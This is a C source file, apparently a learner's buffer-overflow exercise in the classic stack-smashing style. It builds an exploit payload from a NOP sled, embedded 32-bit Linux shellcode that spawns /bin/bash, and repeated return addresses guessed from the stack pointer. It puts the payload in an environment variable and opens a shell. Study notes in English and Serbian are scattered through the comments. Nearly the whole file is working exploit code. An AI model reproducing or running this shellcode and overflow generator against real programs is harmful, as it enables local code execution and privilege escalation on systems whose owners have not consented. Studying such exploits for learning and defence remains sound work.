#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define NOP 0x90
#define BUFFER_SIZE 512
#define DEFAULT_OFFSET 0
/*Using some assembly to get the ESP reg value*/

/*
This is the retarded AT&T syntax that GDB uses also meaning mov source dest
using 
b = byte (8 bit)
s = short (16 bit integer) or single (32-bit floating point)
w = word (16 bit)
l = long (32 bit integer or 64-bit floating point)
q = quad (64 bit)
t = ten bytes (80-bit floating point)
our regs are 32 bit (on 32 bit machines) so we will use l
*/

/*Need to create shellcode and input here*/
char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x09\x5b\xb0\x0b\x31\xc9\x31\xd2\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";
/*Shellcode is good and tested*/

uint32_t get_esp()
{
	__asm__("movl %esp,%eax");
}

main(int argc,char **argv)
{
int buff_size, offset,i,len;
char *buff,*ptr;
/*Here we just want 4BYTE =32 bit type so we can use it, so we are safe*/
int32_t *addr_ptr,addr;
/*
C has standard typedefs for these. Do not define your own. 
They are called intN_t and uintN_t where N is 8, 16, 32, 64, etc. Include <stdint.h> to get them.


*/

buff_size=BUFFER_SIZE;
offset=DEFAULT_OFFSET;

/*I THINK that the real buffer size cannot be bigger than the offset since that would just probably cause a segfault*/
if (argc>1) offset=atoi(argv[1]);
if (argc>2) buff_size=atoi(argv[2]);



if (offset<DEFAULT_OFFSET)
	offset=DEFAULT_OFFSET;

if ((buff=(char *)malloc(buff_size*sizeof(char)))==NULL)
{
	fprintf(stderr, "Couldnt initialize buffer with malloc\n");
	exit(EXIT_FAILURE);
}

/*Need to fix; Dont work with memory virtualization*/
addr=get_esp()-offset;


if (argc>3) addr=strtol(argv[3],NULL,16);

printf("Using addres: 0x%x\n",addr);

/*Filling half of the buffer with NOP's*/
for (i = 0; i < buff_size/2; ++i)
{
	buff[i]=NOP;
}

/*The rest we fill with the address we want to hit
was buff_size/2 -1 without any reason
*/
addr_ptr=(int32_t *) (&(buff[buff_size/2]));

for (i = buff_size/2; (i+4) < buff_size; i=i+4)
{
	/*Here we jump in ranges of 4 cause of the size of ESP and EIP */
	*(addr_ptr++)=addr;
}
/*Enabled by default but a warning when just put on =addr_ptr*/

ptr=buff + (i)*sizeof(char);
for (;i<buff_size;i++)
{
	*(ptr++)=0x00;
}

len=strlen(shellcode);


/*The buffer will look like NNNNNNNSSSSAAAAA where the N is NOP instruction S shellcode and A return address*/
ptr=buff+((buff_size/2)-(len/2))*sizeof(char);
for (i = 0; i < len; ++i,ptr++)
{
	/* added ptr++ */
	*ptr=shellcode[i];
}

/*
Lets say we enter offset 420 (cause that we know will overflow the EIP reg (EBP)
and we have a shellcode of 20 bytes than the buffer would be 200 NOP's 20 Shellcode 200 ret addfress (that will point in the middle of nops (idealy))
good thing is this offset can be nilly willy(not precise in byte)
*/

/*I can make it go to the enviroment or just output so i will way redirect it to some tempfile*/
//printf("%s\n",buff);
memcpy(buff,"COD=",4);
//system("/bin/bash");
putenv(buff);
/*Kompleksno pitanje. Zasto ova linija ?*/
system("/bin/bash");
free(buff);
}

/* Need to fix shellcode in buff, it just prints the first byte, also address is weird C0 FF FF E0 ??*/

















































/*Answer:
And then I run it from the shell, it won't modify the shell's environment - there's no way for a child process to do that. That's why the shell commands that modify the environment are builtins, and why you need to source a script that contains variable settings you want to add to your shell, rather than simply running it.

Tj ne mogu child procesi menjati shell enviroment , njima se prosledjuju kopije enviroment-a ne mogu da uticu na njega.
Stoga palimo nas shell pokrenut procesom i on ce imati enviroment promenljive koje je proces zeleo
*/
